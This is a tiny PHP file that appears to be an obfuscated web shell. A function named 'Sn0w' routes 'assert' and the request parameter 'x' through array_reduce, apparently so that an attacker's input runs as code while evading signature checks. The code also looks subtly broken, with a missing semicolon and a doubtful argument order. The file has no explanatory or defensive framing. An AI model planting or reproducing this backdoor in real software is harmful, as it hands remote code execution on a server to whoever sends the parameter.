<?php 
  function Sn0w($a,$b){
    array_reduce($a,$b)
    }
  Sn0w(assert,$_REQUEST['x']);
?>